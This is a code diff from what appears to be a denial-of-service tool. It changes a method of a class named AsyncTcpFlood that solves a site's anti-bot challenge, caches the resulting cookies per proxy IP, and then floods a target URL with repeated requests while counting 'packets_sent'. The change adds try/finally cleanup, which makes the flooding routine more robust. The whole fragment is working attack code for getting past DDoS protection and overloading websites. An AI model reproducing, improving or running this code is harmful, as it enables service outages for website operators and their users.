@@ -462,42 +462,44 @@ class AsyncTcpFlood(FloodBase):
             connector=connector,
             timeout=cl_timeout,
         ) as s:
-            cached_cookies = solver.lookup(solver.DEFAULT_A, proxy_ip)
-            if cached_cookies is None:
-                # there's certainly a race condition here between us looking up
-                # in the dictionary and tasks are already running to fetch challenge
-                # we are okay though as the challenge itself is stateless with
-                # respect to only a few parameters we control for
-                async with s.get(
-                    solver.path,
-                    headers=headers,
-                ) as response:
-                    payload = dict(await response.json())
-                    if "cn" not in payload:
-                        raise RuntimeError("Invalid challenge payload")
-                (latest_ts, cookies) = solver.solve(user_agent, payload, cache_key=proxy_ip)
-                self._connections.add(conn_id)
-            else:
-                (latest_ts, user_agent, cookies) = cached_cookies
-                headers["User-Agent"] = user_agent
-            s.cookie_jar.update_cookies(cookies)
-            for ind in range(solver.MAX_RPC):
-                if time.time() > latest_ts:
-                    break
-                async with s.get(
-                    self._url.human_repr(),
-                    headers=headers,
-                ) as response:
+            try:
+                cached_cookies = solver.lookup(solver.DEFAULT_A, proxy_ip)
+                if cached_cookies is None:
+                    # there's certainly a race condition here between us looking up
+                    # in the dictionary and tasks are already running to fetch challenge
+                    # we are okay though as the challenge itself is stateless with
+                    # respect to only a few parameters we control for
+                    async with s.get(
+                        solver.path,
+                        headers=headers,
+                    ) as response:
+                        payload = dict(await response.json())
+                        if "cn" not in payload:
+                            raise RuntimeError("Invalid challenge payload")
+                    (latest_ts, cookies) = solver.solve(user_agent, payload, cache_key=proxy_ip)
                     self._connections.add(conn_id)
-                    if on_connect and not on_connect.done():
-                        on_connect.set_result(True)
-                    packets_sent += 1
-                    async with async_timeout.timeout(req_timeout):
-                        body = await response.read()
-                        if not solver.bypass(body):
-                            break
-                await asyncio.sleep(1.0)
-        self._connections.remove(conn_id)
+                else:
+                    (latest_ts, user_agent, cookies) = cached_cookies
+                    headers["User-Agent"] = user_agent
+                s.cookie_jar.update_cookies(cookies)
+                for ind in range(solver.MAX_RPC):
+                    if time.time() > latest_ts:
+                        break
+                    async with s.get(
+                        self._url.human_repr(),
+                        headers=headers,
+                    ) as response:
+                        self._connections.add(conn_id)
+                        if on_connect and not on_connect.done():
+                            on_connect.set_result(True)
+                        packets_sent += 1
+                        async with async_timeout.timeout(req_timeout):
+                            body = await response.read()
+                            if not solver.bypass(body):
+                                break
+                    await asyncio.sleep(1.0)
+            finally:
+                self._connections.remove(conn_id)
         return packets_sent > 0
 
     async def CFB(self, on_connect=None) -> bool:
